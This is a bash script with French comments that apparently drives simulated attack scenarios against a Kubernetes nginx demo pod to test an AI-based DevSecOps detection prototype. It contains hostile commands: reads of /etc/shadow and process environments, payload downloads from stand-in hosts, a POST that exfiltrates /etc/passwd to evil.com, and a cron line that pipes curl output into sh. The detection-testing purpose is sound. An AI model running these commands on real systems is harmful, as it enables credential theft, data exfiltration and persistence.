#!/usr/bin/env bash
# Scénarios d'attaque / test pour le prototype DevSecOps IA (offre AICYOU, phase 4).
# Usage :
#   export KUBECONFIG=/home/eya/devsecops-ai-prototype/terraform/devsecops-lab-config
#   ./scripts/attack_scenarios.sh              # menu
#   ./scripts/attack_scenarios.sh all          # tous les scénarios
#   ./scripts/attack_scenarios.sh S3           # un seul (S0…S8)
set -euo pipefail

NS="${NS:-demo-app}"
APP="${APP:-nginx-demo}"

healthy_pod() {
  kubectl get pods -n "$NS" -l "app=${APP},quarantine!=true" \
    -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true
}

exec_pod() {
  local pod="$1"; shift
  echo "  -> kubectl exec -n $NS $pod -- $*"
  kubectl exec -n "$NS" "$pod" -- "$@" 2>/dev/null || true
}

run_S0() {
  echo "=== S0 BASELINE (attendu : score bas / INFORMATIONAL) ==="
  local p; p="$(healthy_pod)"
  exec_pod "$p" ls /usr/share/nginx/html
  exec_pod "$p" cat /usr/share/nginx/html/index.html
  exec_pod "$p" cat /etc/hostname
  exec_pod "$p" nginx -v
}

run_S1() {
  echo "=== S1 RECON (whoami/id/ps/env — shell inattendu) ==="
  local p; p="$(healthy_pod)"
  exec_pod "$p" whoami
  exec_pod "$p" id
  exec_pod "$p" uname -a
  exec_pod "$p" hostname
  exec_pod "$p" ps aux
  exec_pod "$p" env
  exec_pod "$p" sh -c "id; uname -a"
}

run_S2() {
  echo "=== S2 CREDENTIALS / FICHIERS SENSIBLES ==="
  local p; p="$(healthy_pod)"
  exec_pod "$p" cat /etc/passwd
  exec_pod "$p" cat /etc/shadow
  exec_pod "$p" cat /proc/self/environ
  exec_pod "$p" cat /proc/1/environ
  exec_pod "$p" ls /root/.ssh
  exec_pod "$p" ls /etc/ssh
  exec_pod "$p" sh -c "cat /etc/passwd; cat /etc/shadow"
}

run_S3() {
  echo "=== S3 PACKAGE MANAGER (durée longue → feature is_long_runtime) ==="
  local p; p="$(healthy_pod)"
  exec_pod "$p" apt-get --version
  exec_pod "$p" apt-get update
}

run_S4() {
  echo "=== S4 OUTBOUND PORT NON STANDARD (Falco rport hors 80/443/53) ==="
  local p; p="$(healthy_pod)"
  exec_pod "$p" sh -c "apt-get install -y -qq curl >/dev/null 2>&1 || true"
  exec_pod "$p" sh -c "command -v curl >/dev/null && curl -s --max-time 5 http://example.com:8080/ || true"
  exec_pod "$p" sh -c "command -v wget >/dev/null && wget -q -T 5 -O /dev/null http://example.com:4444/ || true"
}

run_S5() {
  echo "=== S5 C2 / DOMAINES IOC (evil.com, pastebin, malware) ==="
  local p; p="$(healthy_pod)"
  exec_pod "$p" sh -c "command -v curl >/dev/null && curl -s --max-time 5 http://evil.com/collect || true"
  exec_pod "$p" sh -c "command -v curl >/dev/null && curl -s --max-time 5 http://malware.com/payload.bin -o /tmp/p || true"
  exec_pod "$p" sh -c "command -v wget >/dev/null && wget -q -T 5 -O /tmp/bd.sh http://attacker.com/bd.sh || true"
  exec_pod "$p" sh -c "command -v curl >/dev/null && curl -s --max-time 5 http://pastebin.com/raw/XXXXX || true"
}

run_S6() {
  echo "=== S6 EXFIL + PIPE / SUBSHELL (features has_pipe, has_dollar_subshell) ==="
  local p; p="$(healthy_pod)"
  exec_pod "$p" sh -c "cat /etc/passwd | wc -l"
  exec_pod "$p" sh -c 'command -v curl >/dev/null && curl -s --max-time 5 -X POST -d "$(cat /etc/passwd)" http://evil.com/collect || true'
}

run_S7() {
  echo "=== S7 PERSISTENCE (écriture, keywords backdoor/payload) ==="
  local p; p="$(healthy_pod)"
  exec_pod "$p" sh -c "echo '*/5 * * * * curl http://evil.com/cmd | sh' >> /tmp/cron"
  exec_pod "$p" sh -c "echo payload > /tmp/backdoor.sh"
  exec_pod "$p" chmod 755 /tmp/backdoor.sh || true
}

run_S8() {
  echo "=== S8 BURST 5 min (feature event_count_5min) ==="
  local p; p="$(healthy_pod)"
  for i in $(seq 1 15); do
    exec_pod "$p" whoami
  done
}

run_all() {
  run_S0; sleep 2
  run_S1; sleep 2
  run_S2; sleep 2
  run_S3; sleep 2
  run_S4; sleep 2
  run_S5; sleep 2
  run_S6; sleep 2
  run_S7; sleep 2
  run_S8
  echo
  echo "Vérifs :"
  echo "  kubectl get pods -n $NS --show-labels"
  echo "  curl -s http://127.0.0.1:8000/metrics | grep devsecops"
}

case "${1:-menu}" in
  S0) run_S0 ;;
  S1) run_S1 ;;
  S2) run_S2 ;;
  S3) run_S3 ;;
  S4) run_S4 ;;
  S5) run_S5 ;;
  S6) run_S6 ;;
  S7) run_S7 ;;
  S8) run_S8 ;;
  all) run_all ;;
  *)
    cat <<'EOF'
Scénarios (pod nginx-demo, namespace demo-app) :

  S0  Baseline légitime     ls / html / hostname / nginx -v
  S1  Reconnaissance        whoami id uname ps env sh -c
  S2  Credentials           passwd shadow /proc/self/environ .ssh
  S3  Package manager       apt-get (durée longue)
  S4  Outbound port custom  curl/wget :8080 :4444
  S5  Domaines IOC          evil.com malware.com pastebin attacker.com
  S6  Exfil pipe/subshell   cat |  et  $(cat …) POST
  S7  Persistence           cron + backdoor.sh
  S8  Burst                 15× whoami (fenêtre 5 min)

  ./scripts/attack_scenarios.sh all
  ./scripts/attack_scenarios.sh S2
EOF
    ;;
esac
